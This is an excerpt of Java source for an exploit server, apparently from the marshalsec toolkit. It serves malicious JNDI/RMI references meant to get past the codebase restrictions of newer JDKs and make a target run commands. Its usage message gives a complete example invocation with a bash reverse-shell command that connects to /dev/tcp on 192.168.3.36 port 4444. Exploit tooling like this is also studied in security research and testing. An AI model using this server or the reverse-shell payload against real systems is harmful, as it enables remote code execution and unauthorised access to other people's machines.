...
public class RMIRefServer_BypassHighJDK implements Runnable {
    ...
    public RMIRefServer_BypassHighJDK(int port, URL classpathUrl, String[] cmdArray) throws IOException {
        this.port = port;
    ...
    public static final void main ( final String[] args ) {
        ...
        if ( args.length < 3 || args[ 0 ].indexOf('#') < 0 ) {
            System.err.println(RMIRefServer_BypassHighJDK.class.getName() + "<codebase_url#classname> [<port>] [<command array>]");
            System.err.println("example:\n\tmarshalsec.jndi.RMIRefServer_BypassHighJDK \"http://192.168.3.36:8084#Exploit\" 8085 /bin/bash -c \"bash -i >& /dev/tcp/192.168.3.36/4444 0>&1\"");
            System.exit(-1);
            return;
        }

        port = Integer.parseInt(args[1]);
        String[] cmdArr = new String[args.length - 2];
        ...
        try {
            ...
            RMIRefServer_BypassHighJDK c = new RMIRefServer_BypassHighJDK(port, new URL(args[ 0 ]), cmdArr);
            c.run();
        }
        catch ( Exception e ) {
